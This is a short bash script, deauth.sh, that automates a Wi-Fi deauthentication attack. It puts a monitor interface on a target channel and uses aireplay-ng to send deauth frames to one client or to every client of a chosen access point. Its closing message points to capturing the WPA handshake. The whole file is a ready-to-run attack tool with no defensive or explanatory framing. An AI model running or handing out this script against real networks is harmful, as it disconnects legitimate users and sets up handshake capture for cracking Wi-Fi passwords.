#!/bin/bash
# deauth.sh - Automated deauthentication attack

INTERFACE=${1:-wlan1mon}
BSSID=${2}
CHANNEL=${3}
COUNT=${4:-10}
CLIENT=${5}

usage() {
    echo "Usage: $0 <interface> <bssid> <channel> [count] [client_mac]"
    echo "Example: $0 wlan1mon AA:BB:CC:DD:EE:FF 6 20"
    echo "         $0 wlan1mon AA:BB:CC:DD:EE:FF 6 10 11:22:33:44:55:66"
    exit 1
}

if [ "$#" -lt 3 ]; then
    usage
fi

echo "[*] Starting deauthentication attack"
echo "[*] Interface: $INTERFACE"
echo "[*] Target BSSID: $BSSID"
echo "[*] Channel: $CHANNEL"
echo "[*] Packets: $COUNT"

# Set channel
sudo iwconfig "$INTERFACE" channel "$CHANNEL"

if [ -n "$CLIENT" ]; then
    echo "[*] Targeted deauth to client: $CLIENT"
    sudo aireplay-ng --deauth "$COUNT" -a "$BSSID" -c "$CLIENT" "$INTERFACE"
else
    echo "[*] Broadcast deauth (all clients)"
    sudo aireplay-ng --deauth "$COUNT" -a "$BSSID" "$INTERFACE"
fi

echo "[*] Deauth complete"
echo "[*] Monitor airodump for handshake capture"